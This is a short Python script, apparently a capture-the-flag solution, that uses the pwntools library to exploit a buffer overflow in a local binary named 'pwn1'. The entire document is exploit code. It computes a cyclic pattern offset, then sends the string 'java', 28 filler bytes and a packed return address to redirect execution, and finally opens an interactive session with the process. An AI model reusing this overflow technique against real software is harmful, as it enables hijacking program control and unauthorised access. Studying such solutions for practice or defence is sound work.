from pwn import *

context.binary = "./pwn1"
off = cyclic(cyclic_find("kaab"))
print(size(off))
p = process()


p.sendline(b"java" + b"A" * 28 + p32(0x400770 + 50))
p.interactive()
